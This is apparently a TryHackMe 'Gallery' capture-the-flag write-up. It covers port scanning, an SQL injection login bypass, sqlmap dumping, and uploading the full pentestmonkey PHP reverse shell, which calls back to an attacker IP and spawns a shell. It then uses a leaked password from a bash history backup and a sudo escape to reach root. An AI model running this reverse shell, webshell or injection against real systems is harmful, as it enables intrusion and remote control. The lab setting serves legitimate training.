# TryHackMe Gallery Writeup

## **`Nmap`** Scan

```
nmap -sCV 10.10.128.82
```

```ruby
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-19 13:52 EST
Nmap scan report for 10.10.128.82
Host is up (0.10s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 2b:5e:fb:12:37:8a:e4:b6:f6:82:da:c9:14:7a:c3:e1 (RSA)
|   256 64:1f:c3:12:42:11:ca:f4:1e:22:41:ac:29:21:68:ef (ECDSA)
|_  256 5f:42:0d:ab:e7:30:6c:8d:bd:d4:05:4d:0c:87:00:a9 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-title: Simple Image Gallery System
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.25 seconds

```

## Gobuster

```ruby
gobuster dir -u http://10.10.128.82/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<img width="1004" height="357" alt="image" src="https://github.com/user-attachments/assets/de9db1b1-081d-439e-9c00-4a783f573cab" />

<img width="1067" height="589" alt="image" src="https://github.com/user-attachments/assets/4a259c82-89b1-4df5-9daa-8d53d95e88c6" />

```
http://10.10.128.82/gallery/login.php
```

<img width="1377" height="689" alt="image" src="https://github.com/user-attachments/assets/fbf05b74-2d80-4176-bd24-6cce45ab173d" />

## try to pybass with sqli

```
admin' or 'x'='x'; -- -
```

<img width="797" height="498" alt="image" src="https://github.com/user-attachments/assets/ba68e693-8aef-4195-8a8f-19f56a69f972" />

## **`sqlmap`**

```
sqlmap -r reuqest.txt --risk 3 --level 5
```

<img width="1020" height="483" alt="image" src="https://github.com/user-attachments/assets/9a828cc1-6995-4cf4-ac9a-f0be737aacf1" />

```
sqlmap -u "http://10.10.128.82/gallery/?page=albums/images&id=2" \
--method=GET \ 
--dump \      
--batch \
--risk=3 --level=5

```

## reverseshell

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.23.17.145';  // CHANGE THIS
$port = 4444;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

```

<img width="1260" height="363" alt="image" src="https://github.com/user-attachments/assets/c4f6d129-1243-4e37-a85f-cf757a22d858" />

> ### upload the reversshell 

<img width="1166" height="339" alt="image" src="https://github.com/user-attachments/assets/3f4f9395-ede0-49e4-b272-8f5896561c7f" />

<details>
  <summmary>another way</summmary>

<img width="1031" height="580" alt="image" src="https://github.com/user-attachments/assets/7ed4e655-6e59-4d96-a067-c1be1580262e" />

```
http://10.10.128.82/gallery/uploads/1763581500_TagopngghvbulnhdfweLetta.php?cmd=whoami
```

<img width="1243" height="190" alt="image" src="https://github.com/user-attachments/assets/64303dda-ee96-4a4f-921a-88c1787f1fde" />

  
</details>

## **`privesc`**

> linpeas

```ruby
/var/backups/mike_home_backup/.bash_history:sudo -lb3stpassw0rdbr0xx
/var/backups/mike_home_backup/.bash_history:sudo -l

```

``
su mike
``

<img width="973" height="232" alt="image" src="https://github.com/user-attachments/assets/3075090d-fbd3-4741-8c3c-4b2ac3ae4631" />

```
THM{af05cd30bfed6784**********
```

<img width="1048" height="483" alt="image" src="https://github.com/user-attachments/assets/0499abd9-dc58-4a19-a25c-2be4ae4141a3" />

<img width="824" height="92" alt="image" src="https://github.com/user-attachments/assets/6a8a87d6-50c0-4980-b829-9223e92d393c" />

```
Ctrl + R
Ctrl + x
whoami
```

<img width="1038" height="543" alt="image" src="https://github.com/user-attachments/assets/1ffbf69d-c726-4caa-89cc-7405980374eb" />

```
mysqldump -u root gallery_db > /root/db.sql
cat db.sql

```

<img width="802" height="197" alt="image" src="https://github.com/user-attachments/assets/b88153de-55a0-42e2-8cb6-fc9d4ceb45b7" />

<img width="1158" height="485" alt="image" src="https://github.com/user-attachments/assets/b54daa40-3fd1-4d64-ad41-10ba39365f0d" />

